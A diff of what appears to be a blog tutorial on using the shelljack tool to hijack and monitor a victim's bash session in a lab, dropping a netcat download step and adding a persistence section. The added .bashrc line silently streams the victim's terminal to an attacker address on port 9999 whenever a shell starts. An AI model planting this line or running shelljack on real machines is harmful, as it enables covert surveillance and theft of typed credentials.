@@ -7,7 +7,7 @@ Today we will be using shelljack to monitor the bash of a victim with persistenc
 
 ## [](#header-2)Setting up the lab
 
-We will need an attacking machine with netcat installed and a victim machine with netcat, git and [Shelljack](https://github.com/emptymonkey/shelljack).
+We will need an attacking machine with netcat installed and a victim machine with git and [Shelljack](https://github.com/emptymonkey/shelljack).
 
 To install shelljack on the victim's machine:
 
@@ -25,13 +25,6 @@ cd ..
 git clone https://github.com/emptymonkey/shelljack.git
 cd shelljack
 make
-```
-
-If we can't install netcat in the victim's machine, we can download a static bin [nc](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat)
-
-```bash
-wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat
-chmod +x ncat
 ```
 
 ## [](#header-2)Simple attack
@@ -62,3 +55,11 @@ Victim:
 Attacker:
 
 ![POC](https://github.com/M4luk0/m4luk0.github.io/blob/master/images/attacker_poc_1.png)
+
+## [](#header-2)Applying persistence
+
+To apply the persistence we have to modify .bashrc in the victim's machine and add this:
+
+```bash
+tty &>/dev/null; /home/code/shelljack/shelljack -n 192.168.3.3:9999 $$ &>/dev/null
+```
